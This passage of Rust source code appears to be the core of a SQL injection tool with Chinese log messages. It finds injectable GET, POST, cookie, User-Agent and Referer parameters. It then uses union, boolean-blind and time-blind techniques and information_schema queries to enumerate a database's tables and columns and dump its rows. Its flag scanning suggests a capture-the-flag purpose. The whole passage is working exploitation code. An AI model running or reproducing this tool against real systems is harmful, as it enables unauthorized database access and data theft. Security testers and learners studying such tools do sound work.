            method: match args.method {
                MethodArg::Post => "POST".to_string(),
                MethodArg::Get => "GET".to_string(),
            },
            data,
            cookie: args.cookie.clone(),
            marker: args.marker.clone(),
        };
        let prefixes = if args.prefix.is_empty() {
            vec!["'".to_string(), "\"".to_string(), String::new()]
        } else {
            args.prefix.clone()
        };
        let suffixes = if args.suffix.is_empty() {
            vec!["-- -".to_string(), "#".to_string(), String::new()]
        } else {
            args.suffix.clone()
        };
        let mode = args.mode.unwrap_or(OldMode::Auto);
        let detector = OldDetector {
            point: &old_point,
            sender: &sender,
            prefixes,
            suffixes,
            sleep: args.sleep,
            mode,
            true_word: args.true_word.clone(),
        };
        let (kind, prefix, suffix) = match detector.detect(&out) {
            Some(x) => x,
            None => {
                out.error("未检测到注入点 (试试 --true-word 或 --mode time)");
                return finish(exit::NO_RESULT);
            }
        };
        let ex = OldExtractor {
            point: &old_point,
            sender: &sender,
            kind,
            prefix,
            suffix,
            sleep: args.sleep,
            true_word: args.true_word.clone(),
            maxlen: args.maxlen,
        };
        let mut report = Report {
            url: url.clone(),
            carrier: "get".to_string(),
            param: args.param.clone().unwrap_or_default(),
            injectable: true,
            technique: kind.to_string(),
            ..Default::default()
        };
        if args.tables {
            let v = ex.extract(
                "select group_concat(table_name) from information_schema.tables where table_schema=database()",
                &out,
            );
            out.info(&format!("{} 表名: {}", "[*]".blue(), v));
            report.tables = v.split(',').map(|s| s.to_string()).collect();
        } else if let Some(table) = &args.columns {
            if args.table.is_none() {
                let v = ex.extract(
                    &format!(
                        "select group_concat(column_name) from information_schema.columns where table_name='{table}'"
                    ),
                    &out,
                );
                out.info(&format!("{} {} 列: {}", "[*]".blue(), table, v));
                report.table_columns = v.split(',').map(|s| s.to_string()).collect();
            }
        } else if let Some(dump) = &args.dump {
            let table = &dump[0];
            let cols = &dump[1];
            let parts: Vec<String> = cols
                .split(',')
                .map(|c| format!("coalesce(cast({} as char),0x20)", c.trim()))
                .collect();
            let v = ex.extract(
                &format!("select group_concat({}) from {table}", parts.join(",")),
                &out,
            );
            out.info(&format!("{} {} 数据: {}", "[*]".blue(), table, v));
            report.rows = v.split('\n').map(|s| s.to_string()).collect();
        } else if let Some(q) = &args.query {
            let v = ex.extract(q, &out);
            out.info(&format!("{} 结果: {}", "[*]".blue(), v));
            report.rows.push(v);
        } else {
            let v = ex.extract("database()", &out);
            out.info(&format!("{} 默认提取 database(): {}", "[*]".blue(), v));
            report.database = Some(v);
        }
        report.flags = common::scan_flags(serde_json::to_string(&report).unwrap_or_default().as_bytes());
        out.emit(|| {}, &report);
        return finish(exit::OK);
    }

    // ---------- sqlinject 标准流程 ----------
    let mut data = match &args.data {
        Some(d) => parse_form(d),
        None => Vec::new(),
    };

    let (carrier, param, cookie_extra, cookie_header): (Carrier, String, String, Option<String>) = if args.cookie_point {
        let parts: Vec<String> = args
            .cookie
            .as_deref()
            .unwrap_or("")
            .split(';')
            .map(|x| x.trim().to_string())
            .filter(|x| !x.is_empty())
            .collect();
        if parts.is_empty() {
            out.error("--cookie-point 需要 --cookie 提供 Cookie");
            return finish(exit::USAGE);
        }
        let first = &parts[0];
        let p = args
            .param
            .clone()
            .unwrap_or_else(|| first.split('=').next().unwrap_or("").to_string());
        (Carrier::Cookie, p, parts[1..].join("; "), None)
    } else if args.ua_point {
        (Carrier::Ua, args.param.clone().unwrap_or_else(|| "User-Agent".to_string()), String::new(), args.cookie.clone())
    } else if args.referer_point {
        (Carrier::Referer, args.param.clone().unwrap_or_else(|| "Referer".to_string()), String::new(), args.cookie.clone())
    } else if !data.is_empty() {
        let p = args
            .param
            .clone()
            .or_else(|| data.first().map(|(k, _)| k.clone()))
            .unwrap_or_default();
        (Carrier::Post, p, String::new(), args.cookie.clone())
    } else {
        let (_, params, _) = parse_query(&url);
        if params.is_empty() {
            out.error("URL 中没有 GET 参数: 请用 ?id=1 形式, 或改用 -d/--cookie/--ua-point");
            return finish(exit::USAGE);
        }
        let p = args.param.clone().unwrap_or_else(|| params[0].0.clone());
        (Carrier::Get, p, String::new(), args.cookie.clone())
    };

    let point = Point {
        url: url.clone(),
        method: match args.method {
            MethodArg::Post => "POST".to_string(),
            MethodArg::Get => "GET".to_string(),
        },
        param: param.clone(),
        carrier,
        data: std::mem::take(&mut data),
        cookie_extra,
        cookie: cookie_header,
        tamper: tamper_names,
    };

    let mut report = Report {
        url: url.clone(),
        carrier: carrier.name().to_string(),
        param: param.clone(),
        injectable: false,
        technique: "none".to_string(),
        ..Default::default()
    };

    out.info(&format!("{} sqli v{}", "[*]".blue(), env!("CARGO_PKG_VERSION")));
    out.info(&format!(
        "{} 注入点: [{}] 参数 '{}' @ {}",
        "[*]".blue(),
        carrier.name().to_uppercase(),
        param,
        url
    ));

    if let Some(custom) = &args.custom {
        out.info(&format!("自定义 payload: {custom}"));
        let (text, elapsed) = sender.send(&point, custom);
        if out.json() {
            let j = serde_json::json!({
                "custom": custom,
                "length": text.len(),
                "elapsed": elapsed,
                "response": text.chars().take(3000).collect::<String>(),
            });
            println!("{}", serde_json::to_string_pretty(&j).unwrap());
        } else {
            println!("{}", "=".repeat(60).cyan());
            println!("{}", text.chars().take(3000).collect::<String>());
            println!("{}", "=".repeat(60).cyan());
            println!("  {}: {}B / {:.2}s", "响应长度".cyan(), text.len(), elapsed);
        }
        return finish(exit::OK);
    }

    let base = "1";

    // 盲注模式
    if let Some(bmode) = args.blind {
        let cl = detect_closure(&sender, &point, base, &out).unwrap_or_else(|| closures().remove(0));
        report.closure = Some(cl.name.to_string());
        let target = if args.table.is_some() && args.columns.is_some() {
            let src = match &args.db {
                Some(db) => format!("{db}.{}", args.table.as_ref().unwrap()),
                None => args.table.clone().unwrap(),
            };
            format!(
                "select group_concat({}) from {src}",
                args.columns.as_ref().unwrap()
            )
        } else if let Some(t) = &args.table {
            format!(
                "select group_concat(column_name) from information_schema.columns where table_name=0x{}",
                hex_encode(t.as_bytes())
            )
        } else if let Some(db) = &args.db {
            format!(
                "select group_concat(table_name) from information_schema.tables where table_schema=0x{}",
                hex_encode(db.as_bytes())
            )
        } else {
            "database()".to_string()
        };
        let blind = match Blind::new(&sender, &point, &cl, base, bmode, args.sleep, args.fuzzy, &out) {
            Ok(b) => b,
            Err(e) => {
                out.error(&e);
                return finish(exit::ERROR);
            }
        };
        out.info(&format!(
            "{} 盲注模式 [{}] 猜解: {}",
            "[*]".blue(),
            match bmode {
                BlindMode::Bool => "bool",
                BlindMode::Time => "time",
            },
            target
        ));
        let val = blind.ask_str(&target, args.maxlen, &out);
        report.injectable = true;
        report.technique = match bmode {
            BlindMode::Bool => "bool",
            BlindMode::Time => "time",
        }
        .to_string();
        if !val.is_empty() {
            out.info(&format!("{} 结果: {}", "[+]".green(), val));
            report.rows.push(val.clone());
            if args.table.is_none() && args.columns.is_none() && args.db.is_none() {
                report.database = Some(val.clone());
            }
        } else {
            out.info(&format!("{} 未得到结果", "[!]".yellow()));
        }
        report.flags = common::scan_flags(val.as_bytes());
        out.emit(|| {}, &report);
        return finish(if report.rows.is_empty() { exit::NO_RESULT } else { exit::OK });
    }

    // union 标准流程
    let closure = detect_closure(&sender, &point, base, &out);
    let closure = match closure {
        Some(c) => c,
        None => {
            out.info(&format!("{} 回退到时间盲注尝试...", "[*]".blue()));
            let cl = closures().remove(0);
            let blind = match Blind::new(&sender, &point, &cl, base, BlindMode::Time, args.sleep, args.fuzzy, &out) {
                Ok(b) => b,
                Err(e) => {
                    out.error(&e);
                    return finish(exit::ERROR);
                }
            };
            let val = blind.ask_str("database()", args.maxlen, &out);
            report.injectable = !val.is_empty();
            report.technique = "time".to_string();
            if !val.is_empty() {
                out.info(&format!("{} 结果: {}", "[+]".green(), val));
                report.database = Some(val.clone());
                report.rows.push(val.clone());
            }
            report.flags = common::scan_flags(val.as_bytes());
            out.emit(|| {}, &report);
            return finish(if report.injectable { exit::OK } else { exit::NO_RESULT });
        }
    };
    report.closure = Some(closure.name.to_string());

    let cols = match find_columns(&sender, &point, &closure, base, &out) {
        Some(c) => c,
        None => {
            out.info(&format!("{} 无法确定列数, 中止 union 流程 (试试 --blind)", "[!]".yellow()));
            return finish(exit::NO_RESULT);
        }
    };
    report.columns = Some(cols);

    let echo = find_echo(&sender, &point, &closure, base, cols, &out);
    if echo.is_empty() {
        out.info(&format!("{} 无回显位, union 路线终止 (参考报错注入/盲注)", "[!]".yellow()));
        return finish(exit::NO_RESULT);
    }
    report.echo = echo.clone();
    report.injectable = true;
    report.technique = "union".to_string();

    let ex = Extractor {
        sender: &sender,
        point: &point,
        cl: &closure,
        base,
        echo: &echo,
        cols,
    };

    let db = match &args.db {
        Some(d) => Some(d.clone()),
        None => ex.current_db(&out),
    };
    if let Some(ref d) = db {
        report.database = Some(d.clone());
    }

    let table_names: Vec<String> = if let Some(t) = &args.table {
        vec![t.clone()]
    } else {
        match db.as_deref().and_then(|d| ex.tables(d, &out)) {
            Some(t) => t.split(',').map(|s| s.trim().to_string()).collect(),
            None => {
                out.info(&format!("{} 无法枚举表", "[!]".yellow()));
                return finish(exit::NO_RESULT);
            }
        }
    };
    report.tables = table_names.clone();

    let mut got_data = false;
    for tb in &table_names {
        let cols_str = match &args.columns {
            Some(c) => c.clone(),
            None => match ex.columns(tb, db.as_deref(), &out) {
                Some(c) => {
                    report.table_columns = c.split(',').map(|s| s.to_string()).collect();
                    c.split(',').take(6).collect::<Vec<_>>().join(",")
                }
                None => continue,
            },
        };
        let data = ex.dump(tb, &cols_str, db.as_deref(), args.limit);
        match data {
            Some(d) if !d.is_empty() => {
                got_data = true;
                let n_cols = cols_str.split(',').count();
                out.info(&format!("{} [{}] 数据 ({}):", "[+]".green(), tb, cols_str));
                for row in d.split('\n').filter(|r| !r.trim().is_empty()) {
                    let parts: Vec<&str> = row.split(':').collect();
                    if n_cols > 1 && parts.len() >= n_cols {
                        out.info(&format!("    {}", parts[..n_cols].join(" | ")));
                    } else {
                        out.info(&format!("    {row}"));
                    }
                    report.rows.push(row.to_string());
                }
            }
            _ => {
                out.info(&format!("{} [{}] 无数据或提取失败", "[!]".yellow(), tb));
            }
        }
    }

    let all = format!("{} {}", report.rows.join("\n"), report.tables.join(","));
    report.flags = common::scan_flags(all.as_bytes());

    out.emit(|| {}, &report);
    finish(if got_data || !report.rows.is_empty() {
        exit::OK
    } else {
        exit::NO_RESULT
    })
}
